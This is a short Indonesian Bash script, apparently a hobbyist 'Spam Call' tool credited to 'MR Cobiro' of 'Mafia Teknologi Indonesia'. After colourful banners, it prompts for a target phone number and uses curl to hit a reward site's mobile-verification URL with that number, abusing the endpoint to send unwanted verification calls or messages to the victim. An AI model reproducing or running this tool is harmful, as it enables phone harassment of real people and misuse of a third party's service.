#!/bin/bash


# tampilan
clear
figlet SPAM CALL | lolcat
echo -e "=====================================================" | lolcat
echo -e " Author : MR Cobiro" | lolcat
echo -e " Team   : Mafia Teknologi Indonesia" | lolcat
echo -e "=====================================================" | lolcat
echo
echo -e "[1]. Subscribe Author" | lolcat
echo -e "[2]. Spam Call" | lolcat
echo -e "[3]. Keluar" | lolcat
read -p "pilih: " call

if [ $call = 1 ]
then
    xdg-open https://youtube.com/channel/UC2F_TFPuynm51OYUmiLnz0g
fi

if [ $call = 2 ]
then
clear
# tampilan 2
figlet Spam Call | lolcat
echo -e "=================================================" | lolcat
echo -e " [+] Author : Mr Cobiro" | lolcat
echo -e " [+] Team   : Mafia Teknologi" | lolcat
echo -e " [+] Script : SpamCall" | lolcat
echo -e " [+] Huruf Depan Tidak Boleh 0/62" | lolcat
echo -e "=================================================" | lolcat
echo
read -p "Masukan Nomor Target => " nomor;
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
fi

if [ $call = 3 ]
then
echo "Terimah Kasih Salam MR Cobiro"
    exit
fi
